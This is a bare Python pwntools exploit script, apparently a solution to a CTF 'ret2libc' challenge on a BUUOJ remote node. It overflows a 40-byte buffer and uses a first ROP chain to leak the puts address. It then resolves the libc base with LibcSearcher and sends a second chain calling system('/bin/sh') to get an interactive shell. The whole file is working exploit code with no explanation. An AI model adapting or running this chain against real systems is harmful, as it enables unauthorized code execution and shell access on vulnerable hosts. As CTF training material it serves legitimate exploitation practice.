#!/usr/bin/env python3

from pwn import *
from LibcSearcher import *


debug = 0
if debug:
    p = process('./ret2libc')
    context.terminal = ['tmux','splitw','-h']
    context.log_level='debug'
    gdb.attach(p)
else:
    p = remote('node5.buuoj.cn', 25830)
elf = ELF('./ret2libc')
rop = ROP('./ret2libc')


puts_got_addr = elf.got['puts']
puts_plt_addr = elf.plt['puts']
main_plt_addr = elf.symbols['_start']
pop_rdi_gedget = rop.find_gadget(['pop rdi', 'ret'])[0]

print("puts_got_addr:", hex(puts_got_addr))
print("puts_plt_addr:", hex(puts_plt_addr))
print("main_plt_addr:", hex(main_plt_addr))
print('pop_rdi_gedget:', hex(pop_rdi_gedget))

payload = b'A' * 40
payload += p64(pop_rdi_gedget)
payload += p64(puts_got_addr)
payload += p64(puts_plt_addr)
payload += p64(main_plt_addr)

p.recvuntil(b'Show me your magic again\n')
p.sendline(payload)
p.recvuntil(b'See you next time\n')
puts_addr = u64(p.recvuntil(b'\n')[0:-1].ljust(8, b'\x00'))

print('puts_addr:',hex(puts_addr))


libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
sys_addr = libc_base + libc.dump('system')
sh_addr = libc_base + libc.dump('str_bin_sh')
ret_addr = rop.find_gadget(['ret'])[0]

print('libc_base:',hex(libc_base))
print('sys_addr:',hex(sys_addr))
print('sh_addr:',hex(sh_addr))
print('ret_addr:',hex(ret_addr))

payload = b'B' * 40
payload += p64(ret_addr)
payload += p64(pop_rdi_gedget)
payload += p64(sh_addr)
payload += p64(sys_addr)

p.sendline(payload)
p.recvuntil(b'Show me your magic again\n')

p.interactive()
